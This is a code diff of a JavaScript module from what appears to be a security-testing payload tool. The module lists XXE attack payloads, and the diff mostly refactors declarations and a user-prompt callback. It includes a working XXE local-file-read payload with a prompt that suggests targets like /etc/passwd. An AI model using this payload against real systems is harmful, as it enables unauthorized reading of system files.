@@ -1,21 +1,19 @@
-var prompt = require('prompt');
-var log = require('cli-color');
-var options = log.yellow
-var yellow = log.yellow
-var blue = log.cyan
-var black = log.blackBright
-var green = log.green
-var red = log.red
-var M = require('mstring')
-var question = require('../modules/questionUser');
-
-var web = require("../modules/webserver/webserver.js")
+var log = require('cli-color'),
+	options = log.yellow,
+	yellow = log.yellow,
+	blue = log.cyan,
+	black = log.blackBright,
+	green = log.green,
+	red = log.red,
+	M = require('mstring'),
+	ask = require('../modules/questionUser'),
+	web = require("../modules/webserver/webserver.js");
 
 // Payload Array
-arrayWeb = []
+arrayWeb = [];
 
 var Load = function(obj){
-	arrayWeb.push(obj)
+	arrayWeb.push(obj);
 }
 
 /* 
@@ -43,6 +41,21 @@ Optional: callback (used for prompt variable)
 */
 // ########## XXE Attacks
 
+    // var test = function () {
+    //     var x = 'works';
+    //     return {
+    //         testme: x
+    //     }
+    // }
+
+    // var test2 = test();
+
+
+var questions = [];
+var question = function(val){
+	questions.push(val);
+}
+
 
 Load({
 	title: "Remote DTD File Parsing",
@@ -58,15 +71,17 @@ Load({
 	title: "XXE (Local File Read)",
 	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]]>&bar;",
 	category: "XML",
-	callback: function(returnToPrepare){
-	  //question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", "web")
-	  question.ask(["Question 1", "Question 2", console.log])			
+	callback: function(bro){
+
+	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)")
+	  question("Question 2")
+	  question(ask.http)
+	  
+	  ask.some(questions, bro)			
 		
 	}
 })
 
-
-		//
 
 Load({
 	title: "XXE (Local File Exfiltration using parameter entities)",
